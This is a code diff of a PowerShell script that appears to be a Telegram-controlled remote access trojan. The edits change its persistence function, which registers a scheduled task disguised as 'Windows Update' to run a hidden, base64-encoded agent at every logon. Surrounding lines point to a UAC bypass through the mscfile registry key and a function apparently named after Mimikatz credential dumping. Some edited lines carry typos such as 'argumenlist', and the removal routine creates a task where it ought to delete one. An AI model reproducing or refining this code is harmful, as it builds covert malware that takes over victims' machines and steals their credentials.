@@ -174,7 +174,7 @@ Remove-Item -Path registry::HKEY_CURRENT_USER\Software\Classes\mscfile\shell\ope
 function whoami_me {
 If (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator"))
 {[string]$privilegios = "Sin privilegios" }  else {[string]$privilegios = "Privilegios Altos"}; $usuario = $env:USERNAME ; $dominio = $env:USERDOMAIN
-$Usuario = "Usuario: $usuario`n" ; $Dominio =  "Dominio : $dominio`n" ; $Privilegios = "Privlegios :$privilegios`n"; return $usuario ; return $dominio ; retunn $privilegios
+$Usuario = "Usuario: $usuario`n" ; $Dominio =  "Dominio : $dominio`n" ; $Privilegios = "Privlegios :$privilegios`n"; return $usuario, $dominio, $privilegios
  }
 
 function mimigatoz {
@@ -188,7 +188,7 @@ function persistence {
 If (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator"))
 {$texto = "Sorry, necesitas privilegios"; return $texto;break }  else {
 $agent_bot = create_agent -botkey $botkey -chat_id $chat_id;  $agent_bot = $agent_bot -replace "con bypassuac :D","" ; $code = code_a_base64 -code $agent_bot; 
-schtasks.exe /create /tn "Windows Update" /tr  "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -win hidden -enc $code" /sc onlogon
+start-process "schtasks.exe" -argumentlist " /create /tn 'Windows Update' /tr C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -win hidden -enc $code /sc onlogon"
 $texto = "Persistencia ejecutada correctamente"; return $texto;break}
 }
 
@@ -196,7 +196,7 @@ function remove-persistence {
 If (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator"))
 {$texto = "Sorry, necesitas privilegios";return $texto; break }  
 else {$texto = "Eliminando persistencia"
-schtasks.exe /create /tn "Windows Update"| Remove-WmiObject; return $texto; break
+start-process "schtasks.exe" -argumenlist "/create /tn 'Windows Update'" ; return $texto; break
 }}
 
 function test-command {param ($comando="",$botkey="",$chat_id="",$first_connect="") 
